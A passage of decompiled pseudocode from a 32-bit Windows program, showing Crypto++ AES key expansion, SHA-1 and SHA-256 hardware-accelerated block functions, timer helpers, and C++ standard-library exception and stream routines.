  v5 = Size >> 2;
  __asm { aeskeygenassist xmm0, xmm1, 0 }
  v25 = &unk_46E6C4;
  v7 = (int *)&a3[4 * (Size >> 2)];
  v24 = v7;
  v8 = *(_DWORD *)a3 ^ _mm_extract_epi32(_XMM0, 3) ^ 1;
  *v7 = v8;
  v9 = v8 ^ *((_DWORD *)a3 + 1);
  v7[1] = v9;
  v10 = v9 ^ *((_DWORD *)a3 + 2);
  *(_DWORD *)&a3[4 * v5 + 8] = v10;
  *(_DWORD *)&a3[4 * v5 + 12] = v10 ^ *((_DWORD *)a3 + 3);
  result = (char *)(v7 + 4);
  while ( result != &a3[16 * (Size >> 2) + 112] )
  {
    if ( Size == 24 )
    {
      v12 = v3[4] ^ v3[9];
      v13 = v12 ^ v3[5];
      v3[10] = v12;
      v3[11] = v13;
      _XMM1 = _mm_insert_epi32(_XMM1, v13, 3);
    }
    else if ( Size == 32 )
    {
      _XMM1 = _mm_insert_epi32(_XMM1, v3[11], 3);
      __asm { aeskeygenassist xmm0, xmm1, 0 }
      v16 = v3[4] ^ _mm_extract_epi32(_XMM0, 2);
      v17 = v16 ^ v3[5];
      v3[12] = v16;
      v18 = v17 ^ v3[6];
      v3[13] = v17;
      v19 = v18 ^ v3[7];
      v3[14] = v18;
      v3[15] = v19;
      _XMM1 = _mm_insert_epi32(_XMM1, v19, 3);
    }
    else
    {
      _XMM1 = _mm_insert_epi32(_XMM1, v3[7], 3);
    }
    v3 = v24;
    __asm { aeskeygenassist xmm0, xmm1, 0 }
    v24 += v5;
    v21 = v25++;
    *v24 = *v3 ^ *v21 ^ _mm_extract_epi32(_XMM0, 3);
    v22 = *v24 ^ v3[1];
    v24[1] = v22;
    v23 = v22 ^ v3[2];
    v3[v5 + 2] = v23;
    v3[v5 + 3] = v23 ^ v3[3];
    result = (char *)&v7[v5 + 4];
    v7 = v24;
  }
  return result;
}

//----- (00428E46) --------------------------------------------------------
__m128i *__cdecl sub_428E46(__m128i *a1, __m128i *a2, unsigned int a3, int a4)
{
  __m128i *result; // eax
  __m128i v7; // xmm6
  unsigned int v8; // edx
  __int128 v123; // [esp+0h] [ebp-40h]
  __m128i v124; // [esp+10h] [ebp-30h]
  __m128i v125; // [esp+20h] [ebp-20h]
  __m128i v126; // [esp+30h] [ebp-10h]

  result = 0;
  _XMM4 = _mm_unpacklo_epi32(
            (__m128i)0i64,
            _mm_unpacklo_epi32(_mm_cvtsi32_si128(0), _mm_cvtsi32_si128(a1[1].m128i_u32[0])));
  _XMM5 = _mm_shuffle_epi32(*a1, 27);
  if ( a4 == 1 )
    v7 = (__m128i)xmmword_46E910;
  else
    v7 = (__m128i)xmmword_46E920;
  v124 = v7;
  if ( a3 >= 0x40 )
  {
    result = a2 + 2;
    v8 = a3 >> 6;
    do
    {
      _XMM2 = _mm_shuffle_epi8(result[-2], v7);
      _XMM3 = _mm_shuffle_epi8(result[-1], v7);
      _XMM7 = _mm_shuffle_epi8(*result, v7);
      _XMM1 = _XMM5;
      v126 = _XMM5;
      __asm { sha1nexte xmm1, xmm3 }
      v125 = _XMM4;
      _XMM0 = _mm_add_epi32(_XMM2, _XMM4);
      __asm { sha1rnds4 xmm5, xmm0, 0 }
      _XMM0 = _XMM5;
      __asm
      {
        sha1rnds4 xmm5, xmm1, 0
        sha1nexte xmm0, xmm7
      }
      _XMM1 = _XMM5;
      __asm
      {
        sha1rnds4 xmm5, xmm0, 0
        sha1msg1 xmm2, xmm3
      }
      _XMM6 = _mm_shuffle_epi8(result[1], v124);
      _XMM4 = _mm_xor_si128(_XMM7, _XMM2);
      _XMM0 = _XMM5;
      __asm
      {
        sha1nexte xmm1, xmm6
        sha1msg2 xmm4, xmm6
        sha1rnds4 xmm5, xmm1, 0
        sha1msg1 xmm3, xmm7
        sha1nexte xmm0, xmm4
        sha1msg1 xmm7, xmm6
      }
      _XMM1 = _XMM5;
      __asm { sha1rnds4 xmm5, xmm0, 0 }
      _XMM2 = _mm_xor_si128(_XMM6, _XMM3);
      _XMM7 = _mm_xor_si128(_XMM7, _XMM4);
      __asm
      {
        sha1msg2 xmm2, xmm4
        sha1msg1 xmm6, xmm4
        sha1nexte xmm1, xmm2
        sha1msg2 xmm7, xmm2
      }
      _XMM0 = _XMM5;
      _XMM6 = _mm_xor_si128(_XMM6, _XMM2);
      __asm
      {
        sha1rnds4 xmm5, xmm1, 1
        sha1nexte xmm0, xmm7
        sha1msg2 xmm6, xmm7
      }
      _XMM1 = _XMM5;
      __asm
      {
        sha1rnds4 xmm5, xmm0, 1
        sha1msg1 xmm4, xmm2
        sha1nexte xmm1, xmm6
      }
      _XMM0 = _XMM5;
      _XMM3 = _mm_xor_si128(_XMM7, _XMM4);
      __asm
      {
        sha1rnds4 xmm5, xmm1, 1
        sha1msg1 xmm2, xmm7
        sha1msg2 xmm3, xmm6
      }
      _XMM1 = _XMM5;
      _XMM4 = _XMM5;
      _XMM5 = _mm_xor_si128(_XMM6, _XMM2);
      __asm
      {
        sha1msg1 xmm7, xmm6
        sha1nexte xmm0, xmm3
        sha1msg2 xmm5, xmm3
        sha1rnds4 xmm4, xmm0, 1
      }
      _XMM7 = _mm_xor_si128(_XMM7, _XMM3);
      _XMM0 = _XMM4;
      __asm
      {
        sha1msg2 xmm7, xmm5
        sha1nexte xmm1, xmm5
        sha1msg1 xmm6, xmm3
        sha1rnds4 xmm4, xmm1, 1
        sha1msg1 xmm3, xmm5
      }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM5);
      __asm { sha1nexte xmm0, xmm7 }
      _XMM1 = _XMM4;
      _XMM2 = _mm_xor_si128(_XMM7, _XMM3);
      __asm
      {
        sha1msg2 xmm6, xmm7
        sha1rnds4 xmm4, xmm0, 2
        sha1msg1 xmm5, xmm7
      }
      _XMM0 = _XMM4;
      __asm { sha1msg2 xmm2, xmm6 }
      result += 4;
      __asm
      {
        sha1nexte xmm1, xmm6
        sha1rnds4 xmm4, xmm1, 2
      }
      v123 = _XMM4;
      _XMM1 = _XMM4;
      _XMM4 = _mm_xor_si128(_XMM6, _XMM5);
      _XMM5 = v123;
      __asm { sha1msg1 xmm7, xmm6 }
      _XMM7 = _mm_xor_si128(_XMM7, _XMM2);
      __asm
      {
        sha1nexte xmm0, xmm2
        sha1rnds4 xmm5, xmm0, 2
      }
      _XMM0 = _XMM5;
      __asm
      {
        sha1msg2 xmm4, xmm2
        sha1msg1 xmm6, xmm2
      }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM4);
      __asm
      {
        sha1nexte xmm1, xmm4
        sha1rnds4 xmm5, xmm1, 2
      }
      _XMM1 = _XMM5;
      __asm
      {
        sha1msg2 xmm7, xmm4
        sha1msg2 xmm6, xmm7
        sha1nexte xmm0, xmm7
        sha1rnds4 xmm5, xmm0, 2
      }
      _XMM0 = _XMM5;
      __asm { sha1msg1 xmm2, xmm4 }
      _XMM3 = _mm_xor_si128(_XMM7, _XMM2);
      __asm
      {
        sha1nexte xmm1, xmm6
        sha1rnds4 xmm5, xmm1, 3
      }
      _XMM1 = _XMM5;
      __asm { sha1msg1 xmm4, xmm7 }
      _XMM2 = _mm_xor_si128(_XMM6, _XMM4);
      __asm
      {
        sha1msg2 xmm3, xmm6
        sha1msg1 xmm7, xmm6
      }
      _XMM7 = _mm_xor_si128(_XMM7, _XMM3);
      __asm
      {
        sha1nexte xmm0, xmm3
        sha1rnds4 xmm5, xmm0, 3
      }
      _XMM0 = _XMM5;
      __asm
      {
        sha1msg2 xmm2, xmm3
        sha1nexte xmm1, xmm2
        sha1rnds4 xmm5, xmm1, 3
      }
      _XMM1 = _XMM5;
      __asm { sha1msg1 xmm6, xmm3 }
      _XMM6 = _mm_xor_si128(_XMM6, _XMM2);
      __asm
      {
        sha1msg2 xmm7, xmm2
        sha1nexte xmm0, xmm7
        sha1rnds4 xmm5, xmm0, 3
      }
      _XMM4 = _XMM5;
      __asm
      {
        sha1nexte xmm4, [esp+40h+var_20]
        sha1msg2 xmm6, xmm7
        sha1nexte xmm1, xmm6
      }
      v7 = v124;
      __asm { sha1rnds4 xmm5, xmm1, 3 }
      _XMM5 = _mm_add_epi32(_XMM5, v126);
      --v8;
    }
    while ( v8 );
  }
  *a1 = _mm_shuffle_epi32(_XMM5, 27);
  a1[1].m128i_i32[0] = _mm_extract_epi32(_XMM4, 3);
  return result;
}
// 46E910: using guessed type __int128 xmmword_46E910;
// 46E920: using guessed type __int128 xmmword_46E920;

//----- (004290DD) --------------------------------------------------------
__m128i *__usercall sub_4290DD@<eax>(__m128i *result@<eax>, __m128i *a2, __m128i *a3, unsigned int a4, int a5)
{
  __m128i v5; // xmm5
  __m128i v6; // xmm0
  __m128i v7; // xmm2
  __m128i v9; // xmm2
  unsigned int v10; // edx
  __m128i v91; // xmm1
  __m128i v92; // xmm2
  __int128 v93; // [esp+0h] [ebp-50h]
  __int128 v94; // [esp+0h] [ebp-50h]
  __int128 v95; // [esp+0h] [ebp-50h]
  __int128 v96; // [esp+0h] [ebp-50h]
  __int128 v97; // [esp+10h] [ebp-40h]
  __m128i v98; // [esp+20h] [ebp-30h]
  __m128i v99; // [esp+30h] [ebp-20h]
  __m128i v100; // [esp+40h] [ebp-10h]

  if ( a5 == 1 )
    v5 = (__m128i)xmmword_46E930;
  else
    v5 = (__m128i)xmmword_46E940;
  v6 = _mm_shuffle_epi32(*a2, 177);
  v7 = _mm_shuffle_epi32(a2[1], 27);
  _XMM4 = _mm_alignr_epi8(v6, v7, 8);
  v9 = _mm_blend_epi16(v7, v6, 240);
  v98 = v9;
  v99 = v5;
  if ( a4 >= 0x40 )
  {
    result = a3 + 2;
    v10 = a4 >> 6;
    do
    {
      _XMM7 = v9;
      _XMM1 = _mm_shuffle_epi8(result[-2], v5);
      _XMM2 = _mm_shuffle_epi8(result[-1], v5);
      v100 = _XMM4;
      __asm
      {
        sha256rnds2 xmm7, xmm4, xmm0
        sha256rnds2 xmm4, xmm7, xmm0
        sha256rnds2 xmm7, xmm4, xmm0
        sha256rnds2 xmm4, xmm7, xmm0
      }
      _XMM3 = _mm_shuffle_epi8(*result, v5);
      __asm
      {
        sha256msg1 xmm1, xmm2
        sha256rnds2 xmm7, xmm4, xmm0
        sha256rnds2 xmm4, xmm7, xmm0
      }
      v93 = _XMM4;
      __asm { sha256msg1 xmm2, xmm3 }
      _XMM4 = _mm_shuffle_epi8(result[1], v5);
      __asm { sha256rnds2 xmm7, [esp+50h+var_50], xmm0 }
      _XMM5 = _mm_add_epi32(_mm_alignr_epi8(_XMM4, _XMM3, 4), _XMM1);
      _XMM1 = v93;
      __asm
      {
        sha256rnds2 xmm1, xmm7, xmm0
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm7, xmm1, xmm0
        sha256rnds2 xmm1, xmm7, xmm0
      }
      _XMM6 = _mm_add_epi32(_mm_alignr_epi8(_XMM5, _XMM4, 4), _XMM2);
      __asm
      {
        sha256msg2 xmm6, xmm5
        sha256rnds2 xmm7, xmm1, xmm0
        sha256msg1 xmm3, xmm4
        sha256rnds2 xmm1, xmm7, xmm0
      }
      _XMM2 = _mm_add_epi32(_mm_alignr_epi8(_XMM6, _XMM5, 4), _XMM3);
      __asm
      {
        sha256msg2 xmm2, xmm6
        sha256rnds2 xmm7, xmm1, xmm0
        sha256msg1 xmm4, xmm5
      }
      _XMM3 = _mm_add_epi32(_mm_alignr_epi8(_XMM2, _XMM6, 4), _XMM4);
      __asm
      {
        sha256rnds2 xmm1, xmm7, xmm0
        sha256msg2 xmm3, xmm2
      }
      _XMM4 = _XMM1;
      __asm { sha256rnds2 xmm7, xmm1, xmm0 }
      _XMM1 = _XMM7;
      __asm { sha256msg1 xmm5, xmm6 }
      _XMM7 = _mm_add_epi32(_mm_alignr_epi8(_XMM3, _XMM2, 4), _XMM5);
      __asm
      {
        sha256msg1 xmm6, xmm2
        sha256msg2 xmm7, xmm3
        sha256rnds2 xmm4, xmm1, xmm0
        sha256rnds2 xmm1, xmm4, xmm0
      }
      v97 = _XMM1;
      _XMM1 = _mm_add_epi32(_mm_alignr_epi8(_XMM7, _XMM3, 4), _XMM6);
      _XMM6 = v97;
      __asm
      {
        sha256rnds2 xmm4, xmm6, xmm0
        sha256msg2 xmm1, xmm7
      }
      v94 = _XMM4;
      __asm
      {
        sha256rnds2 xmm6, xmm4, xmm0
        sha256msg1 xmm2, xmm3
      }
      _XMM4 = _mm_add_epi32(_mm_alignr_epi8(_XMM1, _XMM7, 4), _XMM2);
      _XMM2 = v94;
      __asm
      {
        sha256rnds2 xmm2, xmm6, xmm0
        sha256msg2 xmm4, xmm1
        sha256rnds2 xmm6, xmm2, xmm0
        sha256rnds2 xmm2, xmm6, xmm0
        sha256msg1 xmm3, xmm7
      }
      _XMM5 = _mm_add_epi32(_mm_alignr_epi8(_XMM4, _XMM1, 4), _XMM3);
      __asm
      {
        sha256msg2 xmm5, xmm4
        sha256rnds2 xmm6, xmm2, xmm0
        sha256rnds2 xmm2, xmm6, xmm0
        sha256msg1 xmm7, xmm1
        sha256msg1 xmm1, xmm4
      }
      _XMM3 = _mm_add_epi32(_mm_alignr_epi8(_XMM5, _XMM4, 4), _XMM7);
      v95 = _XMM2;
      __asm
      {
        sha256msg2 xmm3, xmm5
        sha256rnds2 xmm6, xmm2, xmm0
      }
      _XMM2 = _mm_add_epi32(_mm_alignr_epi8(_XMM3, _XMM5, 4), _XMM1);
      _XMM1 = v95;
      __asm
      {
        sha256rnds2 xmm1, xmm6, xmm0
        sha256msg2 xmm2, xmm3
      }
      v96 = _XMM1;
      __asm
      {
        sha256rnds2 xmm6, xmm1, xmm0
        sha256msg1 xmm4, xmm5
      }
      _XMM1 = _mm_add_epi32(_mm_alignr_epi8(_XMM2, _XMM3, 4), _XMM4);
      _XMM4 = v96;
      __asm
      {
        sha256rnds2 xmm4, xmm6, xmm0
        sha256msg2 xmm1, xmm2
        sha256rnds2 xmm6, xmm4, xmm0
        sha256rnds2 xmm4, xmm6, xmm0
        sha256msg1 xmm5, xmm3
      }
      _XMM0 = _mm_add_epi32(_mm_alignr_epi8(_XMM1, _XMM2, 4), _XMM5);
      __asm
      {
        sha256msg2 xmm0, xmm1
        sha256rnds2 xmm6, xmm4, xmm0
      }
      result += 4;
      v9 = _mm_add_epi32(v98, _XMM6);
      v98 = v9;
      v5 = v99;
      __asm { sha256rnds2 xmm4, xmm6, xmm0 }
      _XMM4 = _mm_add_epi32(_XMM4, v100);
      --v10;
    }
    while ( v10 );
  }
  v91 = _mm_shuffle_epi32(v98, 177);
  v92 = _mm_shuffle_epi32(_XMM4, 27);
  *a2 = _mm_blend_epi16(v92, v91, 240);
  a2[1] = _mm_alignr_epi8(v91, v92, 8);
  return result;
}
// 46E930: using guessed type __int128 xmmword_46E930;
// 46E940: using guessed type __int128 xmmword_46E940;

//----- (0042946A) --------------------------------------------------------
LARGE_INTEGER sub_42946A()
{
  int LastError; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  LARGE_INTEGER PerformanceCount; // [esp+10h] [ebp-70h] BYREF
  char v5[24]; // [esp+18h] [ebp-68h] BYREF
  int v6[6]; // [esp+30h] [ebp-50h] BYREF
  _DWORD pExceptionObject[13]; // [esp+48h] [ebp-38h] BYREF
  int v8; // [esp+7Ch] [ebp-4h]

  PerformanceCount.QuadPart = 0i64;
  if ( !QueryPerformanceCounter(&PerformanceCount) )
  {
    LastError = GetLastError();
    v1 = sub_40BF8D(v6, LastError, 0xAu);
    v8 = 0;
    v2 = (_DWORD *)sub_40C8C7((int)v5, "Timer: QueryPerformanceCounter failed with error ", (_BYTE **)v1);
    LOBYTE(v8) = 1;
    sub_406307(pExceptionObject, 6, v2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVException_CryptoPP__);
  }
  return PerformanceCount;
}
// 42946A: using guessed type int var_50[6];
// 42946A: using guessed type char var_68[24];
// 42946A: using guessed type _DWORD pExceptionObject[13];

//----- (004294DD) --------------------------------------------------------
LARGE_INTEGER sub_4294DD()
{
  int LastError; // eax
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  LARGE_INTEGER Frequency; // [esp+10h] [ebp-70h] BYREF
  char v5[24]; // [esp+18h] [ebp-68h] BYREF
  int v6[6]; // [esp+30h] [ebp-50h] BYREF
  _DWORD pExceptionObject[13]; // [esp+48h] [ebp-38h] BYREF
  int v8; // [esp+7Ch] [ebp-4h]

  Frequency.QuadPart = 0i64;
  if ( !QueryPerformanceFrequency(&Frequency) )
  {
    LastError = GetLastError();
    v1 = sub_40BF8D(v6, LastError, 0xAu);
    v8 = 0;
    v2 = (_DWORD *)sub_40C8C7((int)v5, "Timer: QueryPerformanceFrequency failed with error ", (_BYTE **)v1);
    LOBYTE(v8) = 1;
    sub_406307(pExceptionObject, 6, v2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVException_CryptoPP__);
  }
  return Frequency;
}
// 4294DD: using guessed type int var_50[6];
// 4294DD: using guessed type char var_68[24];
// 4294DD: using guessed type _DWORD pExceptionObject[13];

//----- (00429550) --------------------------------------------------------
__int64 sub_429550()
{
  if ( dword_491D28 > *(_DWORD *)(*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex) + 4) )
  {
    _Init_thread_header(&dword_491D28);
    if ( dword_491D28 == -1 )
    {
      qword_491D20 = sub_4294DD().QuadPart;
      _Init_thread_footer(&dword_491D28);
    }
  }
  return qword_491D20;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 491D20: using guessed type __int64 qword_491D20;
// 491D28: using guessed type int dword_491D28;
// 492450: using guessed type int TlsIndex;

//----- (004295BE) --------------------------------------------------------
char sub_4295BE()
{
  return 1;
}

//----- (004295F3) --------------------------------------------------------
_DWORD *__thiscall sub_4295F3(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad allocation";
  *this = &std::bad_alloc::`vftable';
  return result;
}
// 46DB74: using guessed type void *std::bad_alloc::`vftable';

//----- (0042960B) --------------------------------------------------------
std::exception *__thiscall sub_42960B(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 46EAF0: using guessed type void *std::invalid_argument::`vftable';

//----- (00429626) --------------------------------------------------------
std::exception *__thiscall sub_429626(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::invalid_argument::`vftable';
  return this;
}
// 46EAF0: using guessed type void *std::invalid_argument::`vftable';

//----- (00429645) --------------------------------------------------------
std::exception *__thiscall sub_429645(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 46EAFC: using guessed type void *std::length_error::`vftable';

//----- (00429660) --------------------------------------------------------
std::exception *__thiscall sub_429660(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 46EAFC: using guessed type void *std::length_error::`vftable';

//----- (0042967F) --------------------------------------------------------
std::exception *__thiscall sub_42967F(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 46EAE4: using guessed type void *std::logic_error::`vftable';

//----- (0042969A) --------------------------------------------------------
std::exception *__thiscall sub_42969A(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 46EB08: using guessed type void *std::out_of_range::`vftable';

//----- (004296B5) --------------------------------------------------------
std::exception *__thiscall sub_4296B5(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 46EB08: using guessed type void *std::out_of_range::`vftable';

//----- (004296D4) --------------------------------------------------------
std::exception *__thiscall sub_4296D4(std::exception *this, char *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 46C9C8: using guessed type void *std::runtime_error::`vftable';

//----- (004296F3) --------------------------------------------------------
void __noreturn sub_4296F3()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_4295F3(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
}
// 4296F3: using guessed type void __noreturn sub_4296F3();
// 4296F3: using guessed type _DWORD pExceptionObject[3];

//----- (00429710) --------------------------------------------------------
void __cdecl __noreturn sub_429710(char *a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_429660((std::exception *)pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);
}

//----- (00429730) --------------------------------------------------------
void __cdecl __noreturn sub_429730(char *a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_4296B5((std::exception *)pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVout_of_range_std__);
}

//----- (00429750) --------------------------------------------------------
void __cdecl __noreturn sub_429750(char *a1)
{
  char pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF

  sub_4296D4((std::exception *)pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVruntime_error_std__);
}

//----- (0042999D) --------------------------------------------------------
int sub_42999D()
{
  return unknown_libname_29(&stru_491D98);
}

//----- (004299A9) --------------------------------------------------------
void sub_4299A9()
{
  sub_42BC82(&stru_491D98);
}

//----- (00429CD2) --------------------------------------------------------
int sub_429CD2()
{
  return dword_491EE0;
}
// 491EE0: using guessed type int dword_491EE0;

//----- (00429EF2) --------------------------------------------------------
_DWORD *__thiscall sub_429EF2(_DWORD *this, int a2, char a3, int a4)
{
  int v5; // eax

  if ( a4 )
  {
    *this = &unk_46ECF4;
    this[6] = &std::ios::`vftable';
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 24;
  v5 = *this;
  this[2] = 0;
  this[3] = 0;
  std::ios::init((struct std::ios_base *)((char *)this + *(_DWORD *)(v5 + 4)), a2, a3);
  return this;
}
// 46EC98: using guessed type void *std::ios::`vftable';
// 46ECF0: using guessed type void *std::istream::`vftable';

//----- (00429F5E) --------------------------------------------------------
void __thiscall sub_429F5E(char *this)
{
  char *v1; // edx

  v1 = this + 24;
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 24] = &std::istream::`vftable';
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 28] = *(_DWORD *)(*(_DWORD *)this + 4) - 24;
  *((_DWORD *)this + 6) = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)(this + 24));
}
// 46EC10: using guessed type void *std::ios_base::`vftable';
// 46ECF0: using guessed type void *std::istream::`vftable';

//----- (00429FBC) --------------------------------------------------------
char *__thiscall sub_429FBC(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)this - *(this - 1) - 24;
  sub_429F5E(v2);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(v2);
  return v2;
}

//----- (0042A04E) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_42A04E(std::locale *a1)
{
  int v1; // esi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // edi
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  struct std::_Facet_base *v6; // [esp+14h] [ebp-10h] BYREF
  int v7; // [esp+20h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v1 = dword_492060;
  v7 = 0;
  v6 = (struct std::_Facet_base *)dword_492060;
  v2 = std::locale::id::operator unsigned int(&unk_491EC4);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( std::codecvt<wchar_t,char,_Mbstatet>::_Getcat((int)&v6, a1) == -1 )
        sub_402BD9();
      v3 = v6;
      LOBYTE(v7) = 1;
      std::_Facet_Register(v6);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_492060 = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 402BD9: using guessed type void __noreturn sub_402BD9(void);
// 403269: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 492060: using guessed type int dword_492060;
// 42A04E: using guessed type char var_14[4];

//----- (0042A0E3) --------------------------------------------------------
_DWORD *__thiscall sub_42A0E3(_DWORD *this, int a2, char a3, int a4)
{
  if ( a4 )
  {
    *this = &unk_46EDF8;
    this[2] = &std::wios::`vftable';
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  std::wios::init((struct std::ios_base *)((char *)this + *(_DWORD *)(*this + 4)), a2, a3);
  return this;
}
// 46EDEC: using guessed type void *std::wios::`vftable';
// 46EDF4: using guessed type void *std::wostream::`vftable';

//----- (0042A14A) --------------------------------------------------------
_DWORD *__thiscall sub_42A14A(_DWORD *this)
{
  _DWORD *v2; // esi

  *this = &std::wstreambuf::`vftable';
  v2 = operator new(8u);
  if ( v2 )
    v2[1] = std::locale::_Init(1);
  else
    v2 = 0;
  this[13] = v2;
  unknown_libname_17(this);
  return this;
}
// 4056D7: using guessed type int __thiscall unknown_libname_17(_DWORD);
// 46ED6C: using guessed type void *std::wstreambuf::`vftable';

//----- (0042A221) --------------------------------------------------------
int __thiscall sub_42A221(_DWORD *this)
{
  bool v2; // zf

  v2 = this[19] == 0;
  *this = &std::wfilebuf::`vftable';
  if ( !v2 )
    std::wfilebuf::_Reset_back();
  if ( *((_BYTE *)this + 72) )
    std::wfilebuf::close(this);
  return sub_42A2B9(this);
}
// 42A2B9: using guessed type int __thiscall sub_42A2B9(_DWORD);
// 42A5A0: using guessed type int std::wfilebuf::_Reset_back(void);
// 42A5FB: using guessed type int __thiscall std::wfilebuf::close(_DWORD);
// 46EDAC: using guessed type void *std::wfilebuf::`vftable';

//----- (0042A2DA) --------------------------------------------------------
void __thiscall sub_42A2DA(char *this)
{
  char *v1; // edx

  v1 = this + 8;
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 8] = &std::wostream::`vftable';
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 12] = *(_DWORD *)(*(_DWORD *)this + 4) - 8;
  *((_DWORD *)this + 2) = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)(this + 8));
}
// 46EC10: using guessed type void *std::ios_base::`vftable';
// 46EDF4: using guessed type void *std::wostream::`vftable';

//----- (0042A338) --------------------------------------------------------
int __stdcall sub_42A338(char a1)
{
  return sub_42A3BA(a1);
}
// 42A3BA: using guessed type _DWORD __stdcall sub_42A3BA(char);

//----- (0042A340) --------------------------------------------------------
_DWORD *__thiscall sub_42A340(_DWORD *Block, char a2)
{
  sub_42A221(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0042A3DF) --------------------------------------------------------
void *__thiscall sub_42A3DF(void *Block, char a2)
{
  sub_42A2B9(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 42A2B9: using guessed type int __thiscall sub_42A2B9(_DWORD);

//----- (0042A575) --------------------------------------------------------
int __thiscall sub_42A575(_DWORD *this, void *a2)
{
  int result; // eax

  result = sub_40331F(a2);
  if ( (_BYTE)result )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = a2;
    return unknown_libname_17(this);
  }
  return result;
}
// 4056D7: using guessed type int __thiscall unknown_libname_17(_DWORD);

//----- (0042A896) --------------------------------------------------------
int __thiscall sub_42A896(_DWORD *this, std::locale *a2)
{
  struct std::_Facet_base *v3; // eax

  v3 = sub_42A04E(a2);
  return sub_42A575(this, v3);
}

//----- (0042AA0A) --------------------------------------------------------
int __stdcall sub_42AA0A(int a1)
{
  return 0xFFFF;
}

//----- (0042B1F3) --------------------------------------------------------
FILE *__cdecl sub_42B1F3(char *FileName, int a2, int ShFlag)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // eax
  int v6; // esi
  FILE *v7; // eax
  FILE *v9; // eax
  FILE *v10; // esi

  v3 = a2;
  v4 = 1;
  if ( (a2 & 0x40) != 0 )
    v3 = a2 | 1;
  if ( (v3 & 8) != 0 )
    v3 |= 2u;
  v5 = v3 & 0xFFFFFF3B;
  v6 = 0;
  do
  {
    if ( v4 == v5 )
      break;
    v4 = dword_46EE78[v6++];
  }
  while ( v4 );
  if ( !dword_46EE74[v6] )
    return 0;
  if ( (a2 & 0x80) != 0 && (v5 & 0xA) != 0 )
  {
    v7 = sub_42B29C(FileName, 0, ShFlag);
    if ( v7 )
    {
      fclose(v7);
      return 0;
    }
  }
  v9 = sub_42B29C(FileName, v6, ShFlag);
  v10 = v9;
  if ( !v9 )
    return 0;
  if ( (a2 & 4) != 0 && fseek(v9, 0, 2) )
  {
    fclose(v10);
    return 0;
  }
  return v10;
}
// 46EE74: using guessed type int dword_46EE74[];
// 46EE78: using guessed type int dword_46EE78[14];

//----- (0042B293) --------------------------------------------------------
FILE *__cdecl sub_42B293(char *FileName, int a2, int ShFlag)
{
